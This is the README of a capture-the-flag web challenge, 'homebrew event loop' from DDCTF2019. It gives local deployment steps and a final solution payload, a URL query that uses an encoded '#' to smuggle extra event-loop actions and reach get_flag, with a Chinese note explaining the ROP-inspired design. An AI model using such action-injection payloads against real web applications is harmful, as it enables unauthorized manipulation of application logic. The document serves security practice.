# [DDCTF2019 Web] homebrew event loop

## Deployment

`$ python eventLoop.py` (python 2.7)    

then visit http://127.0.0.1:5000/d5afe1f66747e857/

## Solution

final payload: `/d5afe1f66747e857/?action:trigger_event%23;action:buy;5%23action:get_flag;`    

then decode the cookie using `decodeCookie.py`

这题是参考了pwn的ROP思想写出来的，为丰富题目背景强行加了一些梗和元素，比如包含敏感信息的'log'、event loop queue之类的，因为很简单所以也没什么好多说的了，希望大家玩的开心。

## Related Challenges

`*ctf 2019` (a.k.a starctf 2019) `homebrewEvtLoop--`(stage 1) and `homebrewEvtLoop#`(stage 2)
